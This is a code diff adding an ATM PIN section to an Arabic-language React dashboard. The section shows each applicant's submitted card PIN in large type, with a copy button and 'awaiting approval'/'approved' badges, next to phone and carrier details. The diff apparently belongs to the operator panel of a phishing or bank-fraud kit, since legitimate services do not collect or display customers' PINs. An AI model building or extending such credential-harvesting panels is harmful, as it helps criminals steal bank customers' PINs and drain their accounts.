@@ -1715,6 +1715,62 @@ export default function Dashboard() {
                 </div>
               )}
 
+              {/* ATM PIN Code Section */}
+              {selectedApplication.atmVerification?.code && (
+                <div className="bg-card rounded-xl shadow-sm border border-border overflow-hidden">
+                  <div className="bg-gradient-to-l from-purple-500/10 to-card px-4 py-3 border-b border-border">
+                    <h3 className="font-bold text-foreground text-sm flex items-center gap-2">
+                      <Lock size={16} className="text-purple-500" />
+                      رمز الصراف (PIN)
+                      {selectedApplication.atmVerification?.status === "submitted" && (
+                        <Badge className="bg-amber-100 text-amber-700 text-[9px] animate-pulse mr-2">
+                          بانتظار الموافقة
+                        </Badge>
+                      )}
+                      {selectedApplication.atmVerification?.status === "approved" && (
+                        <Badge className="bg-green-100 text-green-700 text-[9px] mr-2">
+                          تمت الموافقة
+                        </Badge>
+                      )}
+                    </h3>
+                  </div>
+                  <div className="p-6 space-y-4">
+                    <div className="bg-purple-50 dark:bg-purple-900/30 rounded-lg p-4 text-center border border-purple-200 dark:border-purple-800">
+                      <p className="text-xs text-gray-500 dark:text-gray-400 mb-2">
+                        رمز الصراف PIN
+                      </p>
+                      <p
+                        className="font-mono text-3xl font-bold text-purple-600 dark:text-purple-400"
+                        dir="ltr"
+                        data-testid="text-atm-pin"
+                      >
+                        {selectedApplication.atmVerification.code}
+                      </p>
+                      <Button
+                        size="sm"
+                        variant="outline"
+                        className="mt-3"
+                        onClick={() =>
+                          copyToClipboard(
+                            selectedApplication.atmVerification!.code,
+                            "رمز الصراف",
+                          )
+                        }
+                        data-testid="button-copy-atm-pin"
+                      >
+                        <Copy size={12} className="ml-1" />
+                        نسخ
+                      </Button>
+                    </div>
+                    {selectedApplication.atmVerification.timestamp && (
+                      <p className="text-xs text-muted-foreground text-center">
+                        تم الإرسال: {new Date(selectedApplication.atmVerification.timestamp).toLocaleString("ar-SA")}
+                      </p>
+                    )}
+                  </div>
+                </div>
+              )}
+
               {/* Phone Verification Section */}
               {(selectedApplication.phoneNumber ||
                 selectedApplication.phoneCarrier ||
